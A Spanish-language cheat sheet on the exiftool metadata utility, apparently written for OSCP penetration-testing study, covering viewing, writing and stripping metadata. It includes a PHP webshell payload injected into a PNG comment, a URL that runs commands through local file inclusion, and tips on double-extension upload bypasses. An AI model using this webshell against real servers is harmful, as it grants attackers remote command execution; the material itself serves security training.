# 🛠️ Guía rápida de `exiftool` 

## 📌 ¿Qué es `exiftool`?

`exiftool` es una herramienta de línea de comandos para ver, modificar y eliminar metadatos de archivos como imágenes, documentos y vídeos. Es útil para:

- Inyectar payloads en metadatos (e.g. para LFI, RFI o XSS)
- Extraer información sensible de archivos
- Limpiar o borrar metadatos

---

## 🔍 Ver metadatos de un archivo

```bash
exiftool archivo.jpg
```

- Muestra todos los metadatos del archivo.
- Útil para detectar campos vulnerables o interesantes.

---

## ✏️ Escribir/inyectar metadatos

```bash
exiftool -Comment="Aquí va tu comentario" archivo.jpg
```

- Puedes inyectar cualquier texto.
- Ideal para inyectar código PHP en ataques de LFI + inclusión remota.

### 🐚 Ejemplo: inyectar webshell en un PNG

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' Capture.png
```

---

## 🧽 Borrar todos los metadatos

```bash
exiftool -all= archivo.jpg
```

- Elimina todos los metadatos del archivo.
- Útil si quieres limpiar archivos antes de compartirlos o para pruebas de evasión.

---

## 💾 Crear una copia limpia sin metadatos

```bash
exiftool -all= -overwrite_original archivo.jpg
```

- Elimina metadatos y sobrescribe el archivo original.

---

## 🔄 Ver solo un campo específico

```bash
exiftool -Comment archivo.jpg
```

- Solo muestra el contenido del campo `Comment`.

---

## 🧪 Uso ofensivo típico (OSCP-style)

1. Subes un archivo `.png` con payload PHP en los metadatos.
2. El servidor vulnerable usa `include()` o `highlight_file()` sobre ese archivo.
3. Puedes ejecutar comandos así:

```
http://target/page.php?page=uploads/Capture.png&cmd=id
```

---

## 🛠️ Instalación

```bash
sudo apt install libimage-exiftool-perl
```

---

## 🧠 Consejos para OSCP

- Practica con LFI + exif injection.
- Combina `exiftool` con técnicas de file upload y doble extensión (`.php.png`, `.phtml`, etc.).
- Ten siempre una copia de tu payload PHP listo para inyectar en `Comment`.